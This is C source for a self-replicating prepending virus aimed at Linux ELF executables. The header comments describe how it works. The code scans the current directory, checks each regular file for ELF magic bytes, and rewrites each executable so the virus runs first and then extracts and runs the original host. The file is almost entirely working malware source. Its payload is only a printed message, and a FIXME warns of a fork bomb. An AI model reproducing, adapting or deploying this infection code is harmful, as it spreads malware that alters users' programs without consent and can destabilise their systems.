/*
 * virus.c
 * Author: Protovision
 * Date: 21 September 2013
 * 
 * This a simple prepending virus for ELF executables.
 * It goes through all executable files in the current directory
 * and infects them
 *
 * Infected executables will look like this:
 *
 * +-------+
 * | VIRUS |
 * +-------+
 * | HOST  |
 * +-------+
 * | MAGIC |
 * +-------+
 *
 * MAGIC will be the signature of an infected executable.
 * When an infected program runs, the virus code will 
 * run and then it will extract the host code to a temporary
 * file to execute.
 *
 * This program utilizes the sendfile function.
 * It is a non-standard/non-portable function for transferring
 * data between file descriptors. The sendfile function used
 * here has been tested on Linux 3.8. For portability, feel free
 * to replace calls to sendfile with read/write combinations.
 *
 * FIXME: If the original virus gets infected with it's offspring,
 * it will fork bomb the next time it gets executed. One solution
 * is to append the virus signature to the original virus after
 * compilation (and change VIRUS_SIZE of course).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <elf.h>
#include <sys/sendfile.h>

//The size of this executable after compilation
#define VIRUS_SIZE	13840

//Name of temporary file to write to before replacing host executable
#define VIRUS_TMPHOST	".data.dat"

//Name of temporary executable to extract host code
#define VIRUS_TMPEXEC	".exec"

//Virus signature
#define VIRUS_MAGIC	7177135

//This subroutine is executed as a side-effect after
//infection takes place.

void payload() {
	fputs("This is the virus payload.\n", stdout);
}

//vfd is the open file descriptor of this virus
//host is the filename of the program to infect
int infect(int vfd, const char *host) {
	int tfd, hfd, magic;
	ssize_t n;
	unsigned char e_ident[EI_NIDENT];
	uint16_t e_type;
	struct stat st;
	
	hfd = open(host, O_RDONLY);
	if (hfd == -1) return 0;
	
	if (read(hfd, e_ident, EI_NIDENT) < EI_NIDENT)
		return 0;

	//All programs bear the mark of the beast
	if (
		e_ident[EI_MAG0] != ELFMAG0 ||
		e_ident[EI_MAG1] != ELFMAG1 ||
		e_ident[EI_MAG2] != ELFMAG2 ||
		e_ident[EI_MAG3] != ELFMAG3 
	) return 0;

	if (read(hfd, &e_type, sizeof(e_type)) < sizeof(e_type))
		return 0;

	if (e_type != ET_EXEC && e_type != ET_DYN) return 0;

	//Check if already infected
	lseek(hfd, sizeof(magic) * -1, SEEK_END);
	read(hfd, &magic, sizeof(magic));
	if (magic == VIRUS_MAGIC) return 0;
	magic = VIRUS_MAGIC;

	lseek(vfd, 0, SEEK_SET);
	lseek(hfd, 0, SEEK_SET);
	fstat(hfd, &st);
	
	//Create temporary file	
	tfd = creat(VIRUS_TMPHOST, st.st_mode);
	if (tfd == -1) return 0;

	//Write virus code
	sendfile(tfd, vfd, NULL, VIRUS_SIZE);
	//Write host code
	sendfile(tfd, hfd, NULL, st.st_size);	
	//Write virus signature
	write(tfd, &magic, sizeof(magic));

	close(tfd);
	close(hfd);

	//Replace original host file with our new executable
	rename(VIRUS_TMPHOST, host);
	return 1;
}

int main(int argc, char *const argv[], char *const envp[]) {
	DIR *dir;
	struct dirent *ent;
	struct stat st;
	int vfd, xfd, magic;
	pid_t pid;
	off_t offset;
	ino_t inode;

	vfd = open(argv[0], O_RDONLY);
	fstat(vfd, &st);
	inode = st.st_ino;

	//Search for files to infect	
	dir = opendir(".");
	for (ent = readdir(dir); ent != NULL; ent = readdir(dir)) {

		//Hidden files are immune
		if (ent->d_name[0] == '.') continue;

		//Special files are immune
		stat(ent->d_name, &st);
		if (!S_ISREG(st.st_mode)) continue;

		//Don't want the virus to infect itself
		if (st.st_ino == inode) continue;

		infect(vfd, ent->d_name);
	}				
	closedir(dir);

	payload();

	//Extract host code to temporary file
	offset = lseek(vfd, VIRUS_SIZE, SEEK_SET);
	fstat(vfd, &st);
	xfd = creat(VIRUS_TMPEXEC, st.st_mode);
	read(vfd, &magic, sizeof(magic));
	if (magic != VIRUS_MAGIC)
		lseek(vfd, sizeof(magic) * -1, SEEK_CUR);
	else offset += sizeof(magic);
	sendfile(xfd, vfd, NULL, st.st_size - offset);
	close(xfd);
	close(vfd);
	
	//Run host code
	pid = fork();
	if (pid == 0) exit(execve(VIRUS_TMPEXEC, argv, envp));
	waitpid(pid, NULL, 0);
	unlink(VIRUS_TMPEXEC);
	return 0;		
}
